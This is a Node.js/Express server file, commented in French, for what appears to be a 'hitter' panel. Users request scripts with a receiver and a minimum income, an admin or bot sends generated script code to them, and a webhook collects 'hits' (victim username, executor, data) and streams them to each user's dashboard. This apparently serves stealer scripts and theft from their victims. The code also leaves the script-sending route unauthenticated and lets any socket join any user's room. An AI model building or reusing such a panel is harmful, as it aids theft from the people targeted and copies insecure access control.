require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const path = require('path');
const http = require('http');
const { Server } = require("socket.io");
const cookieParser = require('cookie-parser');
const crypto = require('crypto');

// Modèles
const User = require('./models/User');
const Message = require('./models/Message');
const Script = require('./models/Script');
const ScriptRequest = require('./models/ScriptRequest');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

// --- MIDDLEWARES ---
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(express.static(path.join(process.cwd(), 'public')));

// Connexion MongoDB
mongoose.connect(process.env.MONGO_URI)
    .then(() => console.log("✅ MongoDB Connecté"))
    .catch(err => console.error("❌ Erreur DB:", err));

// Middleware pour protéger les routes
const authMiddleware = (req, res, next) => {
    const token = req.cookies.auth_token;
    if (!token) return res.redirect('/login');
    try {
        const decoded = jwt.verify(token, process.env.JWT_SECRET);
        req.user = decoded;
        next();
    } catch (err) {
        res.clearCookie('auth_token');
        res.redirect('/login');
    }
};

// --- ROUTES RENDU ---
app.get('/', (req, res) => res.sendFile(path.join(process.cwd(), 'public/index.html')));
app.get('/login', (req, res) => res.sendFile(path.join(process.cwd(), 'public/login.html')));
app.get('/signup', (req, res) => res.sendFile(path.join(process.cwd(), 'public/signup.html')));
app.get('/dashboard', authMiddleware, (req, res) => res.sendFile(path.join(process.cwd(), 'public/dashboard.html')));

// --- API AUTH ---
app.post('/api/auth/signup', async (req, res) => {
    try {
        const { username, email, password } = req.body;
        const hashedPassword = await bcrypt.hash(password, 10);
        const newUser = new User({ username, email, password: hashedPassword });
        await newUser.save();
        res.redirect('/login');
    } catch (err) {
        res.status(400).send("Erreur: " + err.message);
    }
});

app.post('/api/auth/login', async (req, res) => {
    const { email, password } = req.body;
    const user = await User.findOne({ email });
    if (user && await bcrypt.compare(password, user.password)) {
        const token = jwt.sign(
            { id: user._id, username: user.username, webhook: user.webhookToken }, 
            process.env.JWT_SECRET, 
            { expiresIn: '24h' }
        );
        res.cookie('auth_token', token, { httpOnly: true });
        res.redirect('/dashboard');
    } else {
        res.send("Identifiants incorrects. <a href='/login'>Réessayer</a>");
    }
});

app.get('/api/user/me', authMiddleware, (req, res) => {
    res.json(req.user);
});

// --- API CHAT GÉNÉRAL ---
app.get('/api/messages', authMiddleware, async (req, res) => {
    try {
        const messages = await Message.find({ recipient: 'General' })
            .sort({ timestamp: 1 })
            .limit(50);
        res.json(messages);
    } catch (err) {
        res.status(500).json({ error: "Erreur de chargement" });
    }
});

app.post('/api/messages/send', authMiddleware, async (req, res) => {
    const { content } = req.body;
    const newMessage = new Message({
        sender: req.user.id,
        senderName: req.user.username,
        recipient: 'General',
        content: content
    });
    await newMessage.save();
    io.emit('new_general_message', newMessage); 
    res.json({ success: true });
});

// --- API MY SCRIPTS ---
app.get('/api/my-scripts', authMiddleware, async (req, res) => {
    try {
        const scripts = await Script.find({ userId: req.user.id }).sort({ createdAt: -1 });
        res.json(scripts);
    } catch (err) {
        res.status(500).json({ error: "Erreur serveur" });
    }
});

// Fonction pour envoyer un script (utilisable par ton bot/admin)
app.post('/api/scripts/send', async (req, res) => {
    try {
        const { webhookuuid, receiver, minincome, script } = req.body;
        const user = await User.findOne({ webhookToken: webhookuuid });
        if (!user) return res.status(404).json({ error: "UUID Invalide" });

        const newScript = new Script({
            userId: user._id,
            receiver,
            minIncome: minincome,
            scriptCode: script
        });
        await newScript.save();
        
        io.to(user._id.toString()).emit('script_generated');
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// --- WEBHOOK RÉCEPTION HITS ---
app.post('/webhook/:token', async (req, res) => {
    const user = await User.findOne({ webhookToken: req.params.token });
    if (user) {
        const hitData = {
            username: req.body.username || "Unknown",
            executor: req.body.executor || "Unknown",
            text: req.body.text || "No data provided",
            date: new Date().toLocaleTimeString()
        };
        // Envoi en temps réel au dashboard de l'utilisateur
        io.to(user._id.toString()).emit('receive_message', hitData);
        return res.json({ status: "success" });
    }
    res.status(404).json({ error: "Token invalide" });
});

app.post('/api/scripts/request', authMiddleware, async (req, res) => {
    try {
        const { receivers, minIncome } = req.body;
        
        const newRequest = new ScriptRequest({
            userId: req.user.id,
            username: req.user.username,
            webhookuuid: req.user.webhook,
            receivers,
            minIncome
        });

        await newRequest.save();
        res.json({ success: true, message: "Request sent to Admin!" });
    } catch (err) {
        res.status(500).json({ error: "Error sending request" });
    }
});
// --- SOCKET.IO ---
io.on('connection', (socket) => {
    socket.on('join_room', (userId) => {
        socket.join(userId);
        console.log(`User ${userId} joined room.`);
    });
});

const PORT = process.env.PORT || 10000;
server.listen(PORT, () => console.log(`🚀 Serveur sur port ${PORT}`));
